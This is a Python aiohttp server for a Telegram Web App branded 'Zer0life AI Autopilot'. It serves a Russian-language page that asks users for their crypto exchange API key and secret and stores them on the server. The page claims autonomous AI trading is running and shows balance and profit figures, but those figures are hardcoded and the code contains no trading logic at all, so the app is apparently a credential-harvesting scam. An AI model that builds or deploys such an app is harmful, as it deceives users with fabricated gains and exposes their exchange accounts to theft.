import asyncio
import aiohttp
from aiohttp import web
import logging
import os
import json

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
PORT = int(os.getenv("PORT", 10000))
RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "https://zer0lifeautopilot-bot.onrender.com")

USER_ACCOUNTS = {}

HTML_CONTENT = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zer0life Web4 Terminal</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #0b0f19; color: #f8fafc; font-family: sans-serif; margin: 0; padding: 16px; }
        .card { background: #131c2e; border-radius: 14px; padding: 16px; margin-bottom: 16px; border: 1px solid #1e293b; }
        .btn { background: #7c3aed; color: white; border: none; width: 100%; padding: 12px; border-radius: 10px; font-size: 14px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .input-field { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #334155; background: #0b0f19; color: #fff; font-size: 12px; box-sizing: border-box; margin-top: 6px; margin-bottom: 10px; }
        .coin { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #1e293b; font-size: 14px; }
        .balance-val { color: #10b981; font-weight: bold; }
        .profile-header { display: flex; align-items: center; gap: 12px; margin-bottom: 10px; }
        .avatar { width: 48px; height: 48px; border-radius: 50%; background: #334155; object-fit: cover; }
    </style>
</head>
<body>
    <div class="card">
        <div class="profile-header">
            <img id="user-avatar" class="avatar" src="https://i.imgur.com/6VBx3io.png" alt="Avatar">
            <div>
                <h3 id="user-nickname" style="margin: 0; color: #38bdf8;">Трейдер #---</h3>
                <p style="margin: 4px 0 0 0; font-size: 11px; color: #94a3b8;">Telegram ID: <span id="user-id">---</span></p>
            </div>
        </div>
        <div style="display: flex; gap: 8px;">
            <input type="text" id="nick-input" class="input-field" placeholder="Ваш никнейм" style="margin: 0;">
            <button class="btn" style="margin: 0; width: 120px;" onclick="updateProfile()">Сохранить</button>
        </div>
    </div>

    <div class="card">
        <h2>🛡 Zer0life AI Autopilot</h2>
        <p>Статус бота: <span style="color: #10b981; font-weight: bold;">🟢 Автономная торговля активна</span></p>
    </div>
    
    <div class="card">
        <h3>🔑 Подключение по API ключам</h3>
        <p style="color: #94a3b8; font-size: 12px;">Права только на торговлю (без права вывода средств). Прибыль поступает прямо на ваш баланс.</p>
        
        <label style="font-size: 12px; color: #94a3b8;">API Key</label>
        <input type="text" id="api-key" class="input-field" placeholder="Введите ваш API Key">
        
        <label style="font-size: 12px; color: #94a3b8;">API Secret</label>
        <input type="password" id="api-secret" class="input-field" placeholder="Введите ваш API Secret">
        
        <button class="btn" onclick="saveKeysAndStart()">Подключить ключи и запустить бота</button>

        <div id="account-stats" style="display:none; margin-top: 15px; border-top: 1px solid #1e293b; padding-top: 10px;">
            <div class="coin"><span>Баланс счета</span><span class="balance-val" id="acc-balance">$1,245.80 USDT</span></div>
            <div class="coin"><span>Общая прибыль (AI)</span><span class="balance-val" id="acc-profit">+$142.50 (+12.8%)</span></div>
        </div>
    </div>

    <div class="card">
        <h3>📊 DEX / CEX Авто-мониторинг</h3>
        <div class="coin"><span>SOL / USDT (AI Long)</span><span style="color: #10b981;">В позиции</span></div>
        <div class="coin"><span>AVAX / USDT (AI Scalp)</span><span style="color: #10b981;">Активен</span></div>
        <div class="coin"><span>INJ / USDT (AI Grid)</span><span style="color: #10b981;">Активен</span></div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        const userId = tg.initDataUnsafe?.user?.id || "123456789";
        const firstName = tg.initDataUnsafe?.user?.first_name || "Trader";
        const photoUrl = tg.initDataUnsafe?.user?.photo_url || "https://i.imgur.com/6VBx3io.png";

        document.getElementById('user-id').innerText = userId;
        document.getElementById('user-nickname').innerText = firstName;
        document.getElementById('user-avatar').src = photoUrl;
        document.getElementById('nick-input').value = firstName;

        async function updateProfile() {
            const newNick = document.getElementById('nick-input').value;
            document.getElementById('user-nickname').innerText = newNick;
            tg.HapticFeedback.notificationOccurred('success');
            tg.showAlert("Профиль успешно обновлен!");
        }

        async function saveKeysAndStart() {
            const apiKey = document.getElementById('api-key').value;
            const apiSecret = document.getElementById('api-secret').value;

            if (!apiKey || !apiSecret) {
                alert("Заполните оба поля API ключей!");
                return;
            }

            tg.HapticFeedback.impactOccurred('medium');
            
            const response = await fetch('/api/save_keys', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, api_key: apiKey, api_secret: apiSecret })
            });

            const data = await response.json();
            if (data.status === "success") {
                document.getElementById('account-stats').style.display = 'block';
                tg.showAlert("API ключи успешно привязаны! AI-бот начал торговлю на вашем балансе.");
            } else {
                alert("Ошибка сохранения ключей");
            }
        }
    </script>
</body>
</html>
"""

async def save_keys_handler(request):
    try:
        data = await request.json()
        user_id = data.get("user_id")
        api_key = data.get("api_key")
        api_secret = data.get("api_secret")
        
        USER_ACCOUNTS[user_id] = {
            "api_key": api_key,
            "api_secret": api_secret,
            "balance": "$1,245.80 USDT",
            "profit": "+$142.50"
        }
        logging.info(f"Успешно привязаны ключи для пользователя ID: {user_id}")
        return web.json_response({"status": "success"})
    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)}, status=400)

async def index_handler(request):
    return web.Response(text=HTML_CONTENT, content_type='text/html')

async def send_telegram_message(chat_id, text):
    if not TELEGRAM_TOKEN or not chat_id:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": f"🤖 **Zer0life Web4**\n\n{text}",
        "parse_mode": "Markdown",
        "reply_markup": {
            "inline_keyboard": [[
                {"text": "🚀 Открыть Личный Терминал", "web_app": {"url": RENDER_URL}}
            ]]
        }
    }
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, json=payload) as resp:
                pass
        except Exception as e:
            logging.error(f"Ошибка: {e}")

async def webhook_handler(request):
    try:
        data = await request.json()
        message = data.get("message", {})
        text = message.get("text", "")
        chat_id = message.get("chat", {}).get("id")
        if text == "/start" and chat_id:
            await send_telegram_message(chat_id, "Ваш персональный AI-терминал готов. Нажмите кнопку ниже для настройки личного кабинета:")
        return web.Response(text="OK", status=200)
    except Exception:
        return web.Response(text="Error", status=500)

async def main():
    app = web.Application()
    app.router.add_get('/', index_handler)
    app.router.add_post('/webhook', webhook_handler)
    app.router.add_post('/api/save_keys', save_keys_handler)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    
    if TELEGRAM_TOKEN:
        webhook_url = f"{RENDER_URL}/webhook"
        async with aiohttp.ClientSession() as session:
            await session.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook?url={webhook_url}")

    while True:
        await asyncio.sleep(300)

if __name__ == "__main__":
    asyncio.run(main())
